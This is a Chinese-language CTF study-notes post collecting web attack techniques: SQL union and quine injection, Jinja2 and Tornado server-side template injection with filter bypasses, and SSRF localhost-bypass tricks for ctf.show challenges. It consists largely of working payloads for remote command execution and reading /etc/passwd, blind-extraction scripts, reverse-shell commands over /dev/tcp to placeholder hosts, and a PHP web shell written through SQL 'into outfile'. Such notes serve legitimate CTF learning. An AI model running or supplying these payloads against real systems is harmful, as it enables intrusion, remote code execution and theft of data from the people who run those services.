---
title: random
date: 2023-08-14 01:02:23
categories:
- 网络安全
tags:
- web 
description: |
    忘记了最开始的
---

## union虚拟表

[GXYCTF 2019]BabySqli

payload`0' union select 0,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456`

就是`union select` 会加一行虚拟表 内容是`0,'admin','e10adc3949ba59abbe56e057f20f883e'`正好密码123456的md5值是这个 从而绕过了密码验证

## quine注入 unique注入

[NISACTF 2022]hardsql

解释：实质上就是返回的值和输入值相同，对于这种输出自己的源代码的程序有一个名称,Qunie

首先先了解一下`replace()`函数

`replace(object,search,replace)`

把object对象中出现的的search全部替换成replace,然后返回替换后的结果

object里面编码不会被替换

即：

`REPLACE(**"REPLACE("B",char(66),"B")"**,char(66),"REPLACE("B",char(66),"B")")`

黑体处的char(66)不会被替换，B会被替换

```bash
mysql> select replace(".",char(46),".");
+---------------------------+
| replace(".",char(46),".") |
+---------------------------+
| .                         |
+---------------------------+


mysql> select REPLACE('REPLACE("B",char(66),"B")',char(66),'REPLACE("B",char(66),"B")');
+---------------------------------------------------------------------------+
| REPLACE('REPLACE("B",char(66),"B")',char(66),'REPLACE("B",char(66),"B")') |
+---------------------------------------------------------------------------+
| REPLACE("REPLACE("B",char(66),"B")",char(66),"REPLACE("B",char(66),"B")") |
+---------------------------------------------------------------------------+

看出输入和输出结果差单引号和双引号
```

我们可以先用依次replace让双引号替换为单引号

S为：`REPLACE( REPLACE('A',CHAR(34),CHAR(39) ),B的编码,'A')`
A为：`REPLACE( REPLACE("B",CHAR(34),CHAR(39) ),B的编码,"B")`

//char(34)是双引号 char(39)是单引号 char(66)是B

S：`replace('A',char(66),'A')` //A为原字符串
A：`replace("B",char(66),"B")`

这里A中的间隔符使用双引号的原因是，A已经被单引号包裹，为避免引入新的转义符号，间隔符需要使用双引号。
//把A替换掉

```bash
replace('replace("B",char(66),"B")',char(66),'replace("B",char(66),"B")')
//执行
+---------------------------------------------------------------------------+
| replace('replace("B",char(66),"B")',char(66),'replace("B",char(66),"B")') |
+---------------------------------------------------------------------------+
| replace("replace("B",char(66),"B")",char(66),"replace("B",char(66),"B")") |
+---------------------------------------------------------------------------+
//单换成双
replace("replace("B",char(66),"B")",char(66),"replace("B",char(66),"B")")
//执行错误

//
replace('replace(replace("B",char(66),"B"),char(34),char(39)',char(66),'replace(replace("B",char(66),"B"),char(34),char(39))')
//结果
+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
| replace('replace(replace("B",char(66),"B"),char(34),char(39)',char(66),'replace(replace("B",char(66),"B"),char(34),char(39))')                            |
+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
| replace(replace("replace(replace("B",char(66),"B"),char(34),char(39))",char(66),"replace(replace("B",char(66),"B"),char(34),char(39))"),char(34),char(39)) |
+-----------------------------------------------------------------------------------------------------------------------------------------------------------+
//不行
//分别单换双
S为：replace(replace('A',char(34),char(39)),char(66),'A')
A为：replace(replace("B",char(34),char(39)),char(66),"B")
//组合
replace(replace('replace(replace("B",char(34),char(39)),char(66),"B")',char(34),char(39)),char(66),'replace(replace("B",char(34),char(39)),char(66),"B")')
//结果
+------------------------------------------------------------------------------------------------------------------------------------------------------------+
| replace(replace('replace(replace("B",char(34),char(39)),char(66),"B")',char(34),char(39)),char(66),'replace(replace("B",char(34),char(39)),char(66),"B")') |
+------------------------------------------------------------------------------------------------------------------------------------------------------------+
| replace(replace('replace(replace("B",char(34),char(39)),char(66),"B")',char(34),char(39)),char(66),'replace(replace("B",char(34),char(39)),char(66),"B")') |
+------------------------------------------------------------------------------------------------------------------------------------------------------------+
```

//构造
S为`'/**/union/**/select/**/replace(replace('A',char(34),char(39)),char(66),'A')#`
A为`"/**/union/**/select/**/replace(replace("B",char(34),char(39)),char(66),"B")#`

//playload
`1'/**/union/**/select/**/replace(replace('1"/**/union/**/select/**/replace(replace("B",char(34),char(39)),char(66),"B")#',char(34),char(39)),char(66),'1"/**/union/**/select/**/replace(replace("B",char(34),char(39)),char(66),"B")#')#`

`1'union/**/select/**/replace(replace('1"union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#',char(34),char(39)),char(46),'1"union/**/select/**/replace(replace(".",char(34),char(39)),char(46),".")#')#`

char被过滤的话还可以用十六机制或者chr()函数

char(34) --> 0x22
char(39) --> 0x27

char(34) --> chr(34)

## ssti jinja2

### 可以利用的类或者函数

#### config

查看配置信息

#### env

`{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('env').read()}}`
可能有非预期

#### popen

`popen()`用于执行系统命令，返回一个文件地址，需要用`read()`来显示文件的内容

#### subprocess.popen

与popen略有不同
`{{"".__class__.__base__.__subclasses__()[485]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}`

#### __import__中的os

`{{"".__class__.__base__.__subclasses__()[80].__init__.__globals__.__import__('os').popen('whoami').read()}}`

#### __builtins__代码执行

```py
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}
{{().__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}
```

#### request

jinja2中存在对象request

`{{request.__init__.__globals__['__builtins__'].open('/etc/passwd').read()}}`
`{{request.application.__globals__['__builtins__'].open('/etc/passwd').read()}}`

#### url_for

`{{url_for.__globals__['current_app'].config}}`
`{{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}`

#### get_flashed_messages

`{{get_flashed_messages.__globals__['current_app'].config}}`
`{{get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}`

#### lipsum

`lipsum`是一个方法，可以直接调用os方法，也可以使用`__buildins__`：

```py
{{lipsum.__globals__['os'].popen('whoami').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
```

#### os._wrap_close

web361

`?name={{''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()}}`

#### __builtins__

web362

- 多个1相加`/?name={{().__class__.__mro__[1].__subclasses__()[1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1%2b1].__init__.__globals__["popen"]("cat /flag").read()}}`

- 利用`(dict(a=b,c=d)|join|count)`构造出2，然后`66*2=132`即可

```py
/?name={% set e=(dict(b=c,c=d)|join|count)%}{{().__class__.__mro__[1].__subclasses__()[e*66].__init__.__globals__["popen"]("cat /flag").read()}}

# 也可以用([a,b]|count)构造出2
/?name={% set e=([a,b]|count)%}{{().__class__.__mro__[1].__subclasses__()[e*66].__init__.__globals__["popen"]("cat /flag").read()}}
```

- url_for`?name={{url_for.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}`

- `?name={{x.__init__.__globals__['__builtins__']}}`
这里的x任意26个英文字母的任意组合都可以，同样可以得到`__builtins__`然后用eval就可以了

- `{% for i in ''.__class__.__mro__[1].__subclasses__() %}{% if i.__name__=='_wrap_close' %}{% print i.__init__.__globals__['popen']('ls').read() %}{% endif %}{% endfor %}`

### 过滤

#### 过滤单双引号

web363

- request绕过`?a=os&b=popen&c=cat /flag&name={{url_for.__globals__[request.args.a][request.args.b](request.args.c).read()}}`

- 字符串拼接  `?name={{url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]}}`--->`?name={{url_for.__globals__['os']}}`

- chr `?name={% set chr=url_for.__globals__.__builtins__.chr %}{% print  url_for.__globals__[chr(111)%2bchr(115)]%}`

- 过滤器 `(()|select|string)[24]`

- 利用config拿到字符串

```py
# popen
/?name={{config.__str__()[17]%2bconfig.__str__()[2]%2bconfig.__str__()[17]%2bconfig.__str__()[43]%2bconfig.__str__()[3]}}

/?name={{().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[config.__str__()[17]%2bconfig.__str__()[2]%2bconfig.__str__()[17]%2bconfig.__str__()[43]%2bconfig.__str__()[3]](request.args.b).read()}}&b=cat /flag
```

#### 过滤单双引号和args

web364

使用cookies

`/?name={{().__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[request.cookies.a](request.cookies.b).read()}}`
或者
`{{url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()}}`
Cookie:
`a=popen;b=cat /flag;`

#### 过滤单双引号和args和[]

web365

- 用`.`

```py
/?name={{x.__init__.__globals__.__builtins__.eval(request.cookies.a)}}
Cookie:
a=__import__('os').popen('cat /flag').read()
```

- 用`getitem`

```py
/?name={{x.__init__.__globals__.__getitem__(request.cookies.b).eval(request.cookies.a)}}
Cookie:
a=__import__('os').popen('cat /flag').read();b=__builtins__;
```

- 用`request.values`

```py
/?name={{x.__init__.__globals__.__getitem__(request.values.b).eval(request.values.a)}}&b=__builtins__&a=__import__('os').popen('tac /flag').read()
```

#### 过滤单双引号和args和[]和_

web366

`lipsum`和`attr`过滤器

`{{().__class__}}`-->`{{()|attr("__class__")}}`

```py
/?name={{(lipsum|attr(request.values.a)).os.popen(request.values.b).read()}}&a=__globals__&b=cat /flag

/?name={{(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)}}
Cookie:
x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__('os').popen('cat /flag').read()
```

web367

同上,多过滤了一个os,用request即可

#### 过滤`{{}}`

web368

- 使用`{%%}`和`print`

`/?name={%print((x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5))%}&x1=__init__&x2=__globals__&x3=__getitem__&x4=__builtins__&x5=__import__('os').popen('cat /flag').read()`

或者盲注

```py
import requests
import urllib
import time

url = 'http://36f667b8-3e4a-4639-ba96-cff20a8e3c86.challenge.ctf.show/'
alp = 'abcdefghijklmnopqrstuvwxyz0123456789-}{'

flag = ''
for i in range(1,100):  
    for j in alp:
        # time.sleep(0.1)
        payload = "{% set flag = (x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)%}{% if flag == request.values.x6%}evo1ution{%endif%}"
        params = {
            'name': payload,
            'x1': '__init__',
            'x2': '__globals__',
            'x3': '__getitem__',
            'x4': '__builtins__',
            'x5': "__import__('os').popen('cat /flag').read({})".format(i),
            'x6': "{}".format(flag+j)
        }

        response = requests.get(url,params=params)
        if 'evo1ution' in response.text:
            flag += j
            print(flag)
            if j == '}':
                exit()
            break

# ctfshow{8ff9262c-1994-4916-abaf-e24871b2d07a}
```

#### 过滤request

web369

- 字符拼接

我们要得到`{%print((lipsum|attr('__globals__')).get('os').popen('cat /flag').read())%}`

```py
import requests
import urllib
import time
import re

url = 'http://478231cf-6cd6-4958-84fd-f3de3b022397.challenge.ctf.show/'
# target = "__globals__" # (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()
# target = "os" # (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()
target = "cat /flag" # (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()

flag = ''
for i in target:
    for j in range(917):
        # time.sleep(0.1)
        payload = "{{%print((config|string|list).pop({}).lower())%}}".format(j)
        params = {
            'name': payload,
        }
        response = requests.get(url,params=params)
        s = re.findall(r'<h3>(.*)</h3>',response.text)[0]
        # print(j,"==>",s)
        if i == s:
            flag += "(config|string|list).pop({}).lower()~".format(j)
            # print(flag)
            break
print(flag[:-1])
```

运行脚本后得到字符构造payload

`/?name={%print((lipsum|attr(((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()))).get(((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())).popen(((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())).read())%}`

另一种方法

`/?name={%print(config|string|list|lower)%}`先执行这个获取字符
放入列表l中

```py
import requests
import urllib
import time
import re

# target = "__globals__" # (config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()
# target = "os" # (config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()
target = "cat /flag" # (config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()
l = 

flag = ''
for i in target:
    for j in range(len(l)):
        if i == l[j]:
            flag += "(config|string|list).pop({}).lower()~".format(j)
            # print(flag)
            break
print(flag[:-1])
```

- 替换字符

join

`?name={%set a=(config|string|list).pop(74)%}{%set globals=(a,a,dict(globals=1)|join,a,a)|join%}{%set init=(a,a,dict(init=1)|join,a,a)|join%}{%set builtins=(a,a,dict(builtins=1)|join,a,a)|join%}{%set a=(lipsum|attr(globals)).get(builtins)%}{%set chr=a.chr%}{%print(a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read())%}`

原理

```py
{%set a=(config|string|list).pop(74)%}  获得 _

{%set globals=(a,a,dict(globals=1)|join,a,a)|join%} 获得__globals__

{%set init=(a,a,dict(init=1)|join,a,a)|join%} 获得__init__

{%set builtins=(a,a,dict(builtins=1)|join,a,a)|join%} 获得__builtins__

{%set a=(lipsum|attr(globals)).get(builtins)%} 获得lipsum.__globals__['__builtins__']

{%set chr=a.chr%} 获得chr

{%print(a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read())%}
获得lipsum.__globals__['__builtins__'].open('/flag').read()
```

#### 过滤数字

(数字的过滤可以拿全角数字来代替半角数字)

还是join

`/?name={%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}{%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}{%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%}{%set x=(()|select|string|list).pop(num)%}{%set o=dict(o=a,s=b)|join%}{%set glob = (x,x,dict(globals=a)|join,x,x)|join %}{%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%}{%set c=dict(chr=a)|join%}{%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%}{%set cmd=chr(numm)~dict(flag=a)|join%}{%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%}{%print((lipsum|attr(glob)).get(o).popen(cmd).read())%}`

如下 count 可以用 length代替

```py
{%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%} #32
{%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%} #47
{%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%} #24
{%set x=(()|select|string|list).pop(num)%} 获得_
{%set o=dict(o=a,s=b)|join%} 获得os
{%set glob = (x,x,dict(globals=a)|join,x,x)|join %} 获得__globals__
{%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%} 获得__builtins__
{%set c=dict(chr=a)|join%} 获得字符串chr
{%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%} 获得chr
{%set cmd=chr(numm)~dict(flag=a)|join%} 获得/flag
{%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%} 获得cat /flag
{%print((lipsum|attr(glob)).get(o).popen(cmd).read())%} 
```

#### fenjing

web370 371

[Python库](https://pypi.org/project/fenjing/)

```py
from fenjing import exec_cmd_payload, config_payload
import logging
logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]
    return all(word in s for word in blacklist)

if __name__ == "__main__":
    shell_payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")
    config_payload = config_payload(waf)

    print(f"{shell_payload=}")
    print(f"{config_payload=}")
```

### 总结

fenjing....

`python -m fenjing webui`

`python3 -m fenjing scan -u "https://ctf.sora.zip/decode/" --tamper-cmd 'base64'`

可以编码 之前误会他了

脚本小子

## tornado ssti

| 语法 | 用途 | 描述 |
|------|------|------|
| `{{ ... }}` | 执行Python语句 | 里面直接写Python语句即可，没有经过特殊的转换。默认输出会经过HTML编码 |
| `{% ... %}` | 特殊内置语法 | 有多种规则，如下表所示 |
| `{# ... #}` | 注释 | - |
| `{% comment ... %}` | 注释 | - |
| `{% apply *function* %}...{% end %}` | 执行函数 | `function`是函数名。`apply`到`end`之间的内容是函数的参数 |
| `{% autoescape *function* %}` | 设置编码方式 | 用于设置当前模板文件的编码方式 |
| `{% block *name* %}...{% end %}` | 引用模板段 | 配合`extends`使用 |
| `{% extends *filename* %}` | 引入模板文件 | 配合`block`使用 |
| `{% for *var* in *expr* %}...{% end %}` | 循环 | 等价于Python的`for`循环 |
| `{% from * import * %}` | 导入模块 | 等价于Python的`import` |
| `{% if %}...{% elif %}...{% else %}...{% end %}` | 条件判断 | 等价于Python的`if` |
| `{% import *module* %}` | 导入模块 | 等价于Python的`import` |
| `{% include *filename* %}` | 合并模板文件 | - |
| `{% raw *expr* %}` | 常规模板语句 | 输出不会被转义 |
| `{% set *x* = *y* %}` | 创建局部变量 | - |
| `{% try %}...{% except %}...{% else %}...{% finally %}...{% end %}` | 异常捕获 | 等同于Python的异常捕获语句 |
| `{% while *condition* %}... {% end %}` | 循环 | 等价于Python的`while`循环 |
| `{% whitespace *mode* %}` | 空白符处理 | 设定模板对于空白符号的处理机制 |

**apply的内置函数列表**:

- `linkify`: 把链接转为HTML链接标签（`<a href="...">`）
- `squeeze`: 作用与`{% whitespace oneline %}`一样

**autoescape的内置函数列表**:

- `xhtml_escape`: HTML编码
- `json_encode`: 转为JSON
- `url_escape`: URL编码

**其他函数**（需要在settings中指定）:

- `xhtml_unescape`: HTML解码
- `url_unescape`: URL解码
- `json_decode`: 解开JSON
- `utf8`: UTF8编码
- `to_unicode`: UTF8解码
- `native_str`: UTF8解码
- `to_basestring`: 历史遗留功能，现在和`to_unicode`是一样的作用
- `recursive_unicode`: 把可迭代对象中的所有元素进行`to_unicode`

### 模版

Tornado 中模板渲染函数在有两个

`render`
`render_string`

Tornado中SSTI 手法基本上兼容 `jinja2、mako` 的 SSTI 手法

```py
{{ __import__("os").system("whoami") }}
{% apply __import__("os").system %}id{% end %}
{% raw __import__("os").system("whoami") %}
```

#### 利用 RequestHandler

为了方便下面把 tornado.web.RequestHandler 称为 handler。需要注意的是，handler 是有 request 属性的，所以理论上 handler 要比 request 实用。

```py
{{handler.get_argument('yu')}}   #比如传入?yu=123则返回值为123
{{handler.cookies}}  #返回cookie值
{{handler.get_cookie("data")}}  #返回cookie中data的值
{{handler.decode_argument('\u0066')}}  #返回f，其中\u0066为f的unicode编码
{{handler.get_query_argument('yu')}}  #比如传入?yu=123则返回值为123
{{handler.settings}}  #比如传入application.settings中的值
```

#### `global()`函数全局调用&绕过`_`

我们可以发现在tornado中是可以直接使用`global()`函数的，更令我们兴奋的是竟然可以直接调用一些python的初始方法，比如`import、eval、print、hex`等，这下似乎我们的payload可以更加简洁了

```py
{{__import__("os").popen("ls").read()}}
{{eval('__import__("os").popen("ls").read()')}}
```

其中第二种方法更多的是为了我们刚才讲到的目的，绕过对_的过滤。

```py
{{eval(handler.get_argument('yu'))}}
?yu=__import__("os").popen("ls").read()
```

#### 绕过`.`

因为tornado中没有过滤器，这样的话我们想要绕过对于.的过滤就有些困难了。而如果想要绕过对于引号的过滤，可以将上面的payload改成如下格式

`{{eval(handler.get_argument(request.method))}}`
然后看下请求方法，如果是get的话就可以传`?GET=__import__("os").popen("ls").read()`，post同理

#### 给出一些payload

```py
1、读文件
{% extends "/etc/passwd" %}
{% include "/etc/passwd" %}

2、 直接使用函数
{{__import__("os").popen("ls").read()}}
{{eval('__import__("os").popen("ls").read()')}}

3、导入库
{% import os %}{{os.popen("ls").read()}}

4、flask中的payload大部分也通用
{{"".__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__["popen"]('ls').read()}}
{{"".__class__.__mro__[-1].__subclasses__()[x].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}

其中"".__class__.__mro__[-1].__subclasses__()[133]为<class 'os._wrap_close'>类
第二个中的x为有__builtins__的class

5、利用tornado特有的对象或者方法
{{handler.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}}
{{handler.request.server_connection._serving_future._coro.cr_frame.f_builtins['eval']("__import__('os').popen('ls').read()")}}

6、利用tornado模板中的代码注入
{% raw "__import__('os').popen('ls').read()"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
```

有过滤

```py
1.过滤一些关键字如import、os、popen等（过滤引号该方法同样适用）
{{eval(handler.get_argument(request.method))}}
然后看下请求方法，如果是get的话就可以传?GET=__import__("os").popen("ls").read()，post同理
2.过滤了括号未过滤引号
{% raw "\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29"%0a    _tt_utf8 = eval%}{{'1'%0a    _tt_utf8 = str}}
3.过滤括号及引号
下面这种方法无回显，适用于反弹shell，为什么用exec不用eval呢？
是因为eval不支持多行语句。
__import__('os').system('bash -i >& /dev/tcp/xxx/xxx 0>&1')%0a"""%0a&data={%autoescape None%}{% raw request.body%0a    _tt_utf8=exec%}&%0a"""
4.其他
通过参考其他师傅的文章学到了下面的方法（两个是一起使用的）
{{handler.application.default_router.add_rules([["123","os.po"+"pen","a","345"]])}}
{{handler.application.default_router.named_rules['345'].target('/readflag').read()}}
```

## ssrf

### web351

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
# curl_init — 初始化 cURL 会话    
# curl_setopt — 设置一个cURL传输选项
# curl_exec — 执行 cURL 会话
# curl_close — 关闭 cURL 会话
```

`post:url=http://127.0.0.1/flag.php`

### web352

ip地址转换工具`https://tool.520101.com/wangluo/jinzhizhuanhuan/`

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127.0.0/')){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

```text
url=http://127.0.0.1/flag.php
url=http://127.0.1/flag.php
url=http://127.1/flag.php
某些部分被省略,省略部分是默认0

也可以进制转换
url=http://0x7F000001/flag.php
url=http://0x7F.00.00.01/flag.php
url=http://2130706433/flag.php
```

### web353

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?
```

同上,秒了
还可以
`CIDR：url=http://127.127.127.127/flag.php`
`url=http://0/flag.php`
`url=http://0.0.0.0/flag.php`
`http://0/`                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
`http://[0:0:0:0:0:ffff:127.0.0.1]/`    # 在liunx下可用，window测试了下不行
`http://[::]:80/`           # 在liunx下可用，window测试了下不行
`http://127。0。0。1/`       # 用中文句号绕过
`http://①②⑦.⓪.⓪.①`
`http://127.1/`
`http://127.00000.00000.001/` # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1

### web354

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

- 域名跳转`url=http://sudo.cc/flag.php``http://sudo.cc`这个域名就是指向`127.0.0.1`

- 302跳转

`header("Location:http://127.0.0.1/flag.php");`

### 限制长度

web355 web356

```php
解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分
数组中可能的键有以下几种：
scheme - 如 http
host
port
user
pass
path
query - 在问号 ? 之后
fragment - 在散列符号 # 之后
    
# 例：
<?php
$url = 'http://username:password@hostname/path?arg=value#anchor';
print_r(parse_url($url));
echo parse_url($url, PHP_URL_PATH);
?>    
# 输出
Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)
/path
```

host直接 `0`或者`127.1`都可以
0在linux系统中会解析成`127.0.0.1`在windows中解析成`0.0.0.0`

### 302跳转/DNSrebinding

web357

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}


echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
```

```php
gethostbyname — 返回主机名对应的 IPv4地址

# php filter函数
filter_var() 获取一个变量，并进行过滤
filter_var_array() 获取多个变量，并进行过滤
......
# PHP 过滤器
FILTER_VALIDATE_IP 把值作为 IP 地址来验证，只限 IPv4 或 IPv6 或 不是来自私有或者保留的范围
FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）
FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）
FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）
FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。

```

在自己服务器上写一个302跳转就好了

### parse_url

web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```

以`http://ctf.`开头,以`show`结尾

`url=http://ctf.@127.0.0.1/flag.php#show`
`url=http://ctf.@127.0.0.1/flag.php?show`

### gopher

web359

```php
docker run -it -v /Users/dionysus/CTF/Tools/Gopherus/:/app python:2.7 bash
cd /app
python2 .\gopherus.py --exploit mysql

username:root
写入一句话木马
select "<?php @eval($_POST['cmd']);?>" into outfile '/var/www/html/1.php';
```

对`_`后的内容进行url编码

## fsockopen

[HNCTF 2022 WEEK2]ez_ssrf

```php
 <?php

